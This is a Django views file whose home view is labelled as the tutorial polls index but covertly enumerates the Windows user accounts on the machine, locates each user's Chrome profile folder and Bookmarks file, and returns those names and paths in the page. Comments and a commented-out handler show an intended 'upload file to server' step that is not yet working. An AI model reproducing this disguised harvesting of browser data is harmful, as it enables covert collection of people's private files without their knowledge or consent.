from django.shortcuts import render
from django.http import HttpResponse
import os
from os.path import exists
# Create your views here.
#upload file of path
# def handle_uploaded_file(f):
#     with open('a.txt', 'wb+') as destination:
#         for chunk in f.chunks():
#             destination.write(chunk)
            
#xem thư mục có bao nhiêu folder --> tạo thư mục mới upload
# def countFolder:
    

            
def home(request):
#     get user in computer
    str = ''
    for filename in os.listdir("C:\\Users\\"):
        str+= filename + '</br>'
    
    list_user = [filename 
                            for filename in os.listdir("C:\\Users\\")]
    print(list_user)

# đường dẫn tới chrome có thể có  
    list_folder =[ "C:\\Users\\" +user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
                    for user in list_user]
    print(list_folder)
    
    
#     for filename in os.listdir(list_folder[1]):
#         str+='<p style="color:blue"> ' +filename + '</p>'
#xác định thư mục có tồn tại
    list_path_chrome = [path 
                        for path in list_folder
                        if(exists(path))]
    
    print(list_path_chrome)                        
# upload file to server   
    for path in list_path_chrome:
        path_bookmark = path + '\\Bookmarks'
        if(exists(path_bookmark)):
            str += path_bookmark
#             handle_uploaded_file('b.txt')

        
    print("dang run home page polls")
    return HttpResponse(str + " <h1>abcdef</h1> Hello, world. You're at the polls index.")